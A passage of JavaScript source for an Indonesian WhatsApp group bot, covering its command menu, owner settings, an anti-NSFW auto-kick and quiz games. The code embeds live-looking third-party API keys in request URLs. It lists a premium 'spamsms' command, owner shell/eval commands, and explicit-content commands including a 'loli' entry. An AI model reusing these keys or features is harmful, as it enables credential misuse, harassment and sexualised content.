						location
						)
				const
					buttonMessages = {
						locationMessage: kntl
							.message
							.locationMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 6,
						quoted: mek
					}
				varo
					.sendMessage(
						id,
						buttonMessages,
						MessageType
						.buttonsMessage,
						options
						)
			}
			if (isGroup && isAntiNsfw && isBotGroupAdmins) {
				if (isImage) {
					var imgbb = require(
						'imgbb-uploader'
						)
						var filePath =
						await varo
						.downloadAndSaveMediaMessage(isImage);
					data = imgbb('39d895963468b814fad0514bd28787e2',
					filePath)
					var resantinsfw = await fetchJson(`https://api.lolhuman.xyz/api/nsfwcheck?apikey=vxro2k21&img=${data.display_url}`)
					var get_resulttt =
					resantinsfw
					.result
				var is_nsfw =
					"No"
				if (Number(
						get_resulttt
						.replace(
							"%",
							"")
						) >= 70)
					var is_nsfw =
						"Yes"
				if (is_nsfw ===
					"Yes") {
					reply(
						`\`\`\`| AntiNSFW Detector |\`\`\`\n\n@${sender.split("@")[0]} telah mengirim gambar NSFW dan akan di kick\nKeakuratan Gambar : ${resantinsfw.result}`)
					varo
						.groupRemove(
							from,
							[
								sender]
							)}
							
						
				}
			}
		switch (command) {


			case 'owner':
			case 'creator':
				if (isBanned) return reply(mess.baned)
				sendKontak(from,
					`${owner}`,
					`${ownerName}`,
					'Developer VXROBOT'
					)
				break



			case 'allmenu':
				if (isBanned) return reply(mess.baned)
				groups = varo
					.chats.array
					.filter(v =>
						v.jid
						.endsWith(
							'g.us'
							))
       stst = await varo.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				privat = varo
					.chats.array
					.filter(v =>
						v.jid
						.endsWith(
							's.whatsapp.net'
							))
				ram2 =
					`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
				uptime = process
					.uptime();
				timestampe =
					speed();
				totalChat =
					await varo
					.chats.all()
				latensie =
					speed() -
					timestampe
				total = math(
					`${groups.length}*${privat.length}`
					)
				textnya = `${ucapanWaktu2}
        
  ${petik}USER INFO${petik}

▷ NAMA : *@${sender.split('@')[0]}*
▷ Bio : *${stst}*
▷ STATUS : *${isOwner ? 'OWNER' : isPremium ? 'Premium' : 'Free'}*
▷ LIMIT BOT : *${isOwner ? '99999999' : isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}`}/${limitCount}*
▷ LIMIT GAME : *${isOwner ? '99999999' : isPremium ? 'Unlimited' : `${cekGLimit(sender, gcount, glimit)}`}/${gcount}*
▷ Balance : *$${isOwner ? '99999999' : `${getBalance(sender, balance)}`}*

  ${petik}BOT WHATSAPP${petik}
      
╭─⬣ COMMAND
│
├─⬣ OWNER
│▷${prefix}bc
│▷${prefix}tobc
│▷${prefix}setpp
│▷${prefix}setbio
│▷${prefix}setname 
│▷${prefix}setthumb
│▷${prefix}setfakethumb 
│▷${prefix}antidelete
│▷${prefix}addupdate
│▷${prefix}getquoted
│▷${prefix}start 
│▷${prefix}restart
│▷${prefix}shutdown 
│▷${prefix}join
│▷${prefix}clearall 
│▷${prefix}leaveall
│▷${prefix}addrespon 
│▷${prefix}dellrespon
│▷${prefix}listrespon 
│▷${prefix}sewa add/del
│▷${prefix}premium add/del
│▷${prefix}sharelock
│▷${prefix}chat 
│▷${prefix}>
│▷${prefix}$ 
│▷${prefix}eval
│▷${prefix}exif 
│▷${prefix}term
│▷${prefix}addblock
│▷${prefix}delblock
│
├─⬣ USER
│▷${prefix}hi
│▷${prefix}me
│▷${prefix}say
│▷${prefix}limit
│▷${prefix}limitgame
│▷${prefix}update
│▷${prefix}ping
│▷${prefix}owner
│▷${prefix}donasi
│▷${prefix}runtime
│▷${prefix}rules
│▷${prefix}level
│▷${prefix}waktu
│▷${prefix}botstat
│▷${prefix}sewabot
│▷${prefix}listsewa
│▷${prefix}cekpremium
│▷${prefix}listpremium
│▷${prefix}leaderboard
│▷${prefix}balance
│▷${prefix}bugreport
│
├─⬣ DOWNLOAD
│▷${prefix}instagram
│▷${prefix}twitter
│▷${prefix}tiktok
│▷${prefix}tiktoknowm
│▷${prefix}tiktokaudio
│▷${prefix}telesticker
│▷${prefix}play
│▷${prefix}ytmp3
│▷${prefix}ytmp4
│▷${prefix}ytplay
│▷${prefix}snack
│▷${prefix}soundcloud
│▷${prefix}mediafire
│▷${prefix}asupan
│▷${prefix}ssweb
│▷${prefix}image
│▷${prefix}pinterest
│▷${prefix}wallpaper
│▷${prefix}patrick
│▷${prefix}doge
│▷${prefix}quotes
│▷${prefix}pantun
│▷${prefix}katabijak
│▷${prefix}faktaunik
│▷${prefix}cerpen
│▷${prefix}ceritahoror
│
├─⬣ SEARCHING
│▷${prefix}ytsearch
│▷${prefix}shopee
│▷${prefix}playstore
│▷${prefix}google
│▷${prefix}wiki
│▷${prefix}igstalk
│▷${prefix}tiktokstalk
│▷${prefix}githubstalk
│▷${prefix}groupwa
│▷${prefix}groupwa2
│
├─⬣ GAME
│▷${prefix}slot
│▷${prefix}suit
│▷${prefix}siapaaku
│▷${prefix}tictactoe
│▷${prefix}family100
│▷${prefix}kimiakuis
│▷${prefix}asahotak
│▷${prefix}caklontong
│▷${prefix}susunkata
│▷${prefix}tebakkata
│▷${prefix}tebaklirik
│▷${prefix}tebakanime
│▷${prefix}tebakgambar
│▷${prefix}tebakjenaka
│▷${prefix}tebakbendera
│▷${prefix}mining
│▷${prefix}wangy
│▷${prefix}truth
│▷${prefix}dare
│▷${prefix}toxic
│▷${prefix}apakah
│▷${prefix}bisakah
│▷${prefix}kapankah
│▷${prefix}dadu
│▷${prefix}rate
│▷${prefix}babi
│▷${prefix}beban
│▷${prefix}cantik
│▷${prefix}ganteng
│▷${prefix}jadian
│▷${prefix}citacita
│▷${prefix}cekmati
│▷${prefix}cekwatak
│▷${prefix}cekcantik
│▷${prefix}cekganteng
│
├─⬣ GROUP
│▷${prefix}afk
│▷${prefix}add
│▷${prefix}kick
│▷${prefix}promote
│▷${prefix}demote
│▷${prefix}xadd
│▷${prefix}xkick
│▷${prefix}xpromote
│▷${prefix}xdemote
│▷${prefix}antilink
│▷${prefix}antinsfw
│▷${prefix}ceksewa
│▷${prefix}infogrup
│▷${prefix}kontak
│▷${prefix}tagall
│▷${prefix}hidetag
│▷${prefix}setnamegc
│▷${prefix}setppgroup
│▷${prefix}setdeskgc
│▷${prefix}sider
│▷${prefix}getbio
│▷${prefix}getdeskgc
│▷${prefix}getpp
│▷${prefix}getprofile
│▷${prefix}linkgc
│▷${prefix}opentime
│▷${prefix}closetime
│▷${prefix}groupsetting
│
├─⬣ MAKER
│▷${prefix}sticker
│▷${prefix}stickerwa
│▷${prefix}swm
│▷${prefix}smeme 
│▷${prefix}ttp
│▷${prefix}attp
│▷${prefix}emoji
│▷${prefix}take
│▷${prefix}toimage
│▷${prefix}tovideo
│▷${prefix}togif
│▷${prefix}tourl
│▷${prefix}tinyurl
│▷${prefix}cuttly
│▷${prefix}nulis
│▷${prefix}translate
│
├─⬣ ANIME
│▷${prefix}chara 
│▷${prefix}gura
│▷${prefix}loli
│▷${prefix}otakudesu
│▷${prefix}manga
│▷${prefix}anime
│▷${prefix}kusonime
│▷${prefix}wallnime
│▷${prefix}doujindesu
│▷${prefix}storyanime
│▷${prefix}quotesanime
│▷${prefix}nekonime
│▷${prefix}husbu
│▷${prefix}waifu
│▷${prefix}kanna
│▷${prefix}sagiri
│▷${prefix}megumin
│▷${prefix}kurumi
│▷${prefix}deku
│▷${prefix}sao
│▷${prefix}chika
│▷${prefix}kaneki
│▷${prefix}touka
│▷${prefix}eren
│▷${prefix}naruto
│▷${prefix}minato
│▷${prefix}sasuke
│▷${prefix}sakura
│▷${prefix}tsunade
│▷${prefix}gojosatoru
│▷${prefix}cosplay
│▷${prefix}milf
│▷${prefix}stickeranime
│
├─⬣ ISLAMI
│▷${prefix}alquran
│▷${prefix}alquranaudio
│▷${prefix}asmaulhusna
│▷${prefix}listsurah
│▷${prefix}kisahnabi
│▷${prefix}quotesislami
│▷${prefix}jadwalsholat
│
├─⬣ NSFW
│▷${prefix}hentai
│▷${prefix}blowjob
│▷${prefix}nsfwneko
│▷${prefix}nsfwcum
│▷${prefix}nsfwpussy
│▷${prefix}nsfwtrap
│▷${prefix}nsfwyuri
│▷${prefix}nsfweroyuri
│▷${prefix}nsfwpussy
│▷${prefix}nsfwavatar
│▷${prefix}nsfwtits
│▷${prefix}nsfwketa
│▷${prefix}nsfwazurlane
│▷${prefix}nsfwbluearchive
│▷${prefix}nsfwgenshin
│▷${prefix}nsfwhonkai
│▷${prefix}nhsearch
│▷${prefix}nhentaipdf
│▷${prefix}bokep
│▷${prefix}xnxx
│▷${prefix}xnxxsearch
│▷${prefix}xnxxdown
│▷${prefix}nekopoisearch
│
├─⬣ DATABASE
│▷${prefix}addvn
│▷${prefix}addsay
│▷${prefix}addcmd
│▷${prefix}addimg
│▷${prefix}addvid
│▷${prefix}addstik
│▷${prefix}delvn
│▷${prefix}delsay
│▷${prefix}delimg
│▷${prefix}delvid
│▷${prefix}delstik
│▷${prefix}listvn
│▷${prefix}listimg
│▷${prefix}listvid
│▷${prefix}liststik
│▷${prefix}listsay
│▷${prefix}listcmd
│▷${prefix}delcmd
└─────────────────⬣`
sendButLocation(from, `${textnya}`, `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1}],{contextInfo: { mentionedJid: [sender]}})
break
case 'menupremium':
	if (isBanned) return reply(mess.baned)
	reply(`*| FITUR PREMIUM |*\n
- ${prefix}addban
- ${prefix}addvn
- ${prefix}addimg
- ${prefix}addvid
- ${prefix}addstik
- ${prefix}delban
- ${prefix}delvn
- ${prefix}delsay
- ${prefix}delimg
- ${prefix}delvid
- ${prefix}delstik
- ${prefix}listsay
- ${prefix}xadd
- ${prefix}xkick
- ${prefix}xpromote
- ${prefix}xdemote
- ${prefix}tagall
- ${prefix}hidetag
- ${prefix}sider
- ${prefix}listonline
- ${prefix}cekpremium
- ${prefix}video
- ${prefix}ytplay
- ${prefix}xnxx
- ${prefix}xnxxsearch
- ${prefix}xnxxdown
- ${prefix}bokep
- ${prefix}telesticker
- ${prefix}stickeranime
- ${prefix}stickerwa
- ${prefix}swm
- ${prefix}take
- ${prefix}chat
- ${prefix}delete
- ${prefix}spamsms
- ${prefix}caripesan
- ${prefix}listsewa
- ${prefix}listpremium`)
break
            case 'sharelock':
				varo.sendMessage(from, `Share Location`, text, {quoted:floc,contextInfo:{mentionedJid:[sender]}})
				break
            case 'hai':
			case 'hi':
				ghost = mek.participant
        	try {
          	ppimg = await varo.getProfilePicture(ghost)
          	} catch {
          	ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
          	}
			  buffer = await getBuffer(ppimg)
			reply(`Hi too @${sender.replace('@s.whatsapp.net', '')}`)
			varo.sendMessage(from, buffer, image, {caption:`>//<\n${ucapanWaktu4} @${sender.replace('@s.whatsapp.net', '')}`, thumbnail: dfrply, contextInfo: {mentionedJid: [sender], "forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `0@s.whatsapp.net`, 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": `Hi sayang`, 'jpegThumbnail': dfrply}}}})
			break
                        case 'setpp':
							if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return textImg('KHUSUS OWNER')
				if (!isQuotedImage) return reply('Command untuk mengubah foto profil bot\n\nExample : ${prefix}setpp (Reply Image)')

					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await varo.downloadAndSaveMediaMessage(enmediau)
					await varo.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
			case 'setbio':
				if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
				if (args.length < 1) return reply(`Command untuk mengubah bio bot\n\nExample : ${prefix}setbio Haloo`)
					iyek = body.slice(8)
				runtime = process.uptime()
					varo.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
			case 'setname':
				if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
				if (args.length < 1) return reply('Command untuk mengubah nama bot\n\nExample : ${prefix}setname VXROBOT')
                                        anu = body.slice(9)
                                        varo.updateProfileName(anu)
                                        reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                                        break
			case 'setreply':
			case 'setfake':
				if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
				if (!q) return reply(`Command untuk mengubah fakereply bot\n\nExample : ${prefix+command} 6289516998339`)
				fake = q
				reply(
					`Succes Mengganti Conversation Fake : ${q}`
					)
				break
			case 'setthumb':
				if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
				if ((isMedia &&
						!mek
						.message
						.videoMessage ||
						isQuotedImage ||
						isQuotedSticker
						) &&
					args
					.length == 0
					) {
					boij =
						isQuotedImage ||
						isQuotedSticker ?
						JSON
						.parse(
							JSON
							.stringify(
								varo
								)
							.replace(
								'quotedM',
								'm'
								)
							)
						.message
						.extendedTextMessage
						.contextInfo :
						mek
					delb =
						await varo
						.downloadMediaMessage(
							boij
							)
					fs.writeFileSync(
						`./VXROMD/vxrobot.jpg`,
						delb
						)
					fakestatus(
						'Sukses'
						)
				} else {
                                         reply(`Command untuk mengubah thumbnail bot\n\nExample : ${prefix+command} (Reply Image)`)
				}
				break
			case 'setfakethumb':
				if (isBanned) return reply(mess.baned)
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
				if ((isMedia &&
						!mek
						.message
						.videoMessage ||
						isQuotedImage ||
						isQuotedSticker
						) &&
					args
					.length == 0
					) {
					boij =
						isQuotedImage ||
						isQuotedSticker ?
						JSON
						.parse(
							JSON
							.stringify(
								varo
								)
							.replace(
								'quotedM',
								'm'
								)
							)
						.message
						.extendedTextMessage
						.contextInfo :
						mek
					delb =
						await varo
						.downloadMediaMessage(
							boij
							)
					fs.writeFileSync(
						`./VXROMD/vxrobot.jpg`,
						delb
						)
					fakestatus(
						'Sukses'
						)
				} else {
					reply(`Command untuk mengubah fake thumbnail bot\n\nExample : ${prefix+command} (Reply Image)`)
				}
				break
			/*case 'command':
				list = []
				listmenu = [
					`groupmenu`,
					`wibumenu`,
					`stickermenu`,
					`islammenu`,
					`sertimenu`,
					`ceritamenu`,
					`makermenu`,
					`dewasamenu`,
					`ownermenu`,
					`gamemenu`,
					`funmenu`,
					`downloadmenu`,
					`infomenu`,
					`othermenu`,
					`toolsmenu`
				]
				listmenuu = [
					`Menu Group`,
					`Wibu Menu`,
					`Sticker Menu`,
					`Islam Menu`,
					`Serti Menu`,
					`Cerita Menu`,
					`Maker Menu`,
					`Dewasa Menu`,
					`Owner Menu`,
					`Game Menu`,
					`Fun Menu`,
					`Downloader`,
					`Info Menu`,
					`MenuLainnya`,
					`Tools Menu`
				]
				nombor = 1
				startnum = 0
				for (let x of
						listmenu) {
					const yy = {
						title: 'silahkan pilih menunya ' +
							nombor++,
						rows: [
						{
							title: `${listmenuu[startnum++]}`,
							description: ``,
							rowId: `${prefix}${x}`
						}]
					}
					list.push(
						yy)
				}
				listmsg(from,
					`${ucapanWaktu}`,
					`Hai kak......\n*${pushname}*\nPilih Disini`,
					list)
				break*/
			case 'stickerwa':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				if (isGroup) return reply('Command ini hanya bisa di private chat')
				if (args
					.length == 0
					) return reply(
					`Command untuk mencari sticker WhatsApp\n\nExample : ${prefix + command} Kucing`
					)
				query = args
					.join(" ")
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/stickerwa?apikey=vxro2k21&query=${q}`
						)
						if (get_result.status != 200) {
							await varo.sendMessage(from, `Error!`, text, {quoted:floc,contextInfo:{mentionedJid:[sender]}})
							varo.sendMessage(`${ownerNumber}`, 'Error Stickerwa : '+ mess.error, text)
							}
				get_result =
					get_result
					.result[0]
					.stickers
				for (var x of
						get_result) {
					ini_buffer =
						await getBuffer(
							`https://api.lolhuman.xyz/api/convert/towebp?apikey=vxro2k21&img=${x}`
							)
					await varo
						.sendMessage(
							from,
							ini_buffer,
							sticker
							)
				}

				break
			//case 'store':
				list = []
				listmenu = [
					`buttonstik`,
					`buttondl`,
					`buttonown`,
					`buttonpen`,
					`buttongame`,
					`buttongc`,
					`buttonwibu`
				]
				listmenuu = [
					`STICKER MENU`,
					`DOWNLOAD MENU`,
					`OWNER MENU`,
					`NULIS MENU`,
					`GAME MENU`,
					`GRUP MENU`,
					`WIBU MENU`
				]
				nombor = 1
				startnum = 0
				for (let x of
						listmenu) {
					const yy = {
						title: 'List Button Menu' +
							nombor++,
						rows: [
						{
							title: `${listmenuu[startnum++]}`,
							description: `\n\n\n\n\`\`\`JAN LUPA SUBSCRIBE YTvaro\`\`\``,
							rowId: `${prefix}${x}`
						}]
					}
					list.push(
						yy)
				}
				listmsg(from,
					`${ucapanWaktu}`,
					`Hai kak.....\n*${pushname}*\nJangan Lupa Subscribe varo Yahh`,
					list)
				break
				//------------------< Game >------------------- 
			case 'limitgame':
				if (isBanned) return reply(mess.baned)
			
				    if (isPremium) return textImg(`Limit/Batas untuk bermain game\n\nLimit : Unlimited\nBalance : Rp.$${getBalance(sender, balance)}\n\n*${prefix}buylimit* untuk membeli limit`)
				textImg(
					`Limit/Batas untuk bermain game\n\nLimit : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.$${getBalance(sender, balance)}\n\n*${prefix}buyglimit* untuk membeli limit`)
				break
				case 'balance':
					if (isBanned) return reply(mess.baned)
					reply(
						`Name : ${pushname}\nBalance : Rp.$${getBalance(sender, balance)}`)
					break
			case 'limit':
			case 'ceklimit':
				if (isBanned) return reply(mess.baned)
				if (isBanned) return reply(mess.baned)
				    if (isPremium) return textImg(`Limit/Batas untuk menggunakan bot\n\nLimit : Unlimited\nBalance : Rp.$${getBalance(sender, balance)}\n\n*${prefix}buylimit* untuk membeli limit`)
				tiyo =
					`Limit/Batas untuk menggunakan bot ini\n\nLimit : ${getLimit(sender, limitCount, limit)}\nBalance : Rp.$${getBalance(sender, balance)}\n\n*${prefix}buylimit* untuk membeli limit`
				textImg(tiyo)
				break;
			//case "jadibot":
				reply(
					"Cara Jadi Bot Dengan Cara Pengajaran membuat Open Pengajaran murid,jual script bot,pengajaran buat bot harga Terjangkau Kak Cmn 30k perma Minat? chat wa Creator ya wa.me/6285731632004 (Creator Bot)")
				break
			//case "ingfocreator":
				reply(
					`Haiii @${sender.split("@")[0]}!\n\nNamaku adalah VXROBOT dan Nama ownerku adalah VXRO\ndia adalah pembuat aku, dia berasal dari kota bekasi dan sekarang merantau ke kota lain umur dia sekitar 1-60 tahunan(tebak sendiri)\ndia suka marah kalo aku di spam jadi jangan di spam yaa\n\nSilahkan gunakan bot ini sewajarnya dan semoga sehat selalu...`,{contextInfo: { mentionedJid: [sender]}})
				break
			/*case 'gelud':
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (mek.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid >
					1) return reply(
					'Hanya bisa dengan 1 orang'
					)
				if (!mek.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid[
						0])
					return
				if (args
					.length ===
					0) return reply(
					`Tag Lawan Yang Ingin Diajak Bermain Game`
					)
				if (fs
					.existsSync(
						`./database/gelud/${from}.json`
						))
					return reply(
						`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`
						)

				gelutSkuy =
					setGelud(
						`${from}`
						)
				gelutSkuy
					.status =
					false
				gelutSkuy.Z =
					sender
					.replace(
						"@s.whatsapp.net",
						"")
				gelutSkuy.Y =
					args[0]
					.replace(
						"@", ""
						);
				fs.writeFileSync(
					`./database/gelud/${from}.json`,
					JSON
					.stringify(
						gelutSkuy,
						null,
						2))
				starGame =
					`👑 Memulai Game Baku Hantam 👊🏻

▷ @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

				varo
					.sendMessage(
						from,
						starGame,
						text, {
							quoted: mek,
							contextInfo: {
								mentionedJid: [
									sender,
									args[
										0
										]
									.replace(
										"@",
										""
										) +
									"@s.whatsapp.net"
								],
							}
						})
				gameAdd(sender,
					glimit)
				break
			//case 'delsesigelud':
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (fs
					.existsSync(
						'./database/gelud/' +
						from +
						'.json')
					) {
					fs.unlinkSync(
						'./database/gelud/' +
						from +
						'.json'
						)
					reply(
						'Berhasil Menghapus Sesi Gelud')
				} else {
					reply(
						'Tidak ada sesi yang berlangsung')
				}
				break*/


			case 'family100':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (game.isfam(
						from,
						family100
						))
					return reply(
						`Masih ada soal yang belum di selesaikan`
						)
				anu =
					await axios
					.get(
						`http://api.lolhuman.xyz/api/tebak/family100?apikey=vxro2k21`
						)
				reply(
					`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.answer.length}\n\nWaktu : ${gamewaktu}s`)
				let anoh = anu
					.data.result
					.answer
				let rgfds = []
				for (let i of
						anoh) {
					let fefs = i
						.split(
							'/'
							) ?
						i.split(
							'/'
							)[
						0] : i
					let iuhbb =
						fefs
						.startsWith(
							' '
							) ?
						fefs
						.replace(
							' ',
							''
							) :
						fefs
					let axsf =
						iuhbb
						.endsWith(
							' '
							) ?
						iuhbb
						.replace(
							iuhbb
							.slice(
								-
								1
								),
							''
							) :
						iuhbb
					rgfds.push(
						axsf
						.toLowerCase()
						)
				}
				game.addfam(
					from,
					rgfds,
					gamewaktu,
					family100
					)
				gameAdd(sender,
					glimit)
				break
			case 'tebakanime':
				if (isBanned) return reply(mess.baned)
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebakanime
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Selesaikan yang sebelumnya!"
						)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/tebakchara?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				ini_image =
					get_result
					.image
				jawaban =
					get_result
					.name
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_image
						)
				varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: '   \`\`\`| Tebak Anime |\`\`\`\n\n▷ *Petunjuk :*' +
								kisi_kisi +
								'\n▷ *Waktu :* 60 detik'
						}).then(
						() => {
							tebakanime
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakanime.json",
								JSON
								.stringify(
									tebakanime
									)
								)
						})
				await sleep(
					60000)
				if (tebakanime
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("*Jawaban*: " +
						jawaban
						)
					delete tebakanime
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakanime.json",
						JSON
						.stringify(
							tebakanime
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			//case 'tebaklagu':
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebaklagu
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Selesaikan yang sebelumnya!"
						)
				get_result =
					await fetchJson(
						`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`
						)
				get_result =
					get_result
					.result
				ini_audio =
					get_result
					.preview
				jawaban =
					get_result
					.judul
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_audio
						)
				reply('*+* ```Tebak Lagu```\n\n▷ *Petunjuk* :' +
					kisi_kisi +
					'\n▷ *Waktu* : 60 detik'
					)
				varo
					.sendMessage(
						from,
						ini_buffer,
						audio, {
							quoted: mek
						}).then(
						() => {
							tebaklagu
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaklagu.json",
								JSON
								.stringify(
									tebaklagu
									)
								)
						})
				await sleep(
					60000)
				if (tebaklagu
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("*Jawaban*: " +
						jawaban
						)
					delete tebaklagu
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebaklagu.json",
						JSON
						.stringify(
							tebaklagu
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			//case 'tebaktebakan':
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebaktebakan
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yg belum terjawab"
						)
				get_result =
					await fetchJson(
						`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${setting.xteamkey}`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.soal
				varo
					.sendMessage(
						from,
						'*+* ```Tebak Tebakan```\n\n▷ *soal* :' +
						pertanyaan +
						'\n▷ *kisi²* :' +
						kisi_kisi,
						text, {
							quoted: mek
						}).then(
						() => {
							tebaktebakan
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaktebakan.json",
								JSON
								.stringify(
									tebaktebakan
									)
								)
						})
				await sleep(
					60000)
				if (tebaktebakan
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebaktebakan
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebaktebakan.json",
						JSON
						.stringify(
							tebaktebakan
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			//case 'kuismath':
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (kuismath
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Selesaikan yang sebelumnya!"
						)
				get_result =
					await fetchJson(
						`https://api-yogipw.herokuapp.com/api/kuis/math`
						)
				ini_image =
					get_result
					.soal
				jawaban =
					get_result
					.jawaban
				ini_buffer =
					await getBuffer(
						ini_image
						)
				varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n▷ *Waktu* : 50s'
						}).then(
						() => {
							kuismath
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/kuismath.json",
								JSON
								.stringify(
									kuismath
									)
								)
						})
				await sleep(
					50000)
				if (kuismath
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("*Jawaban*: " +
						jawaban
						)
					delete kuismath
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/kuismath.json",
						JSON
						.stringify(
							kuismath
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'kurumi':
			case 'deku':
			case 'sao':
			case 'chika':
			case 'kaneki':
			case 'touka':
			case 'eren':
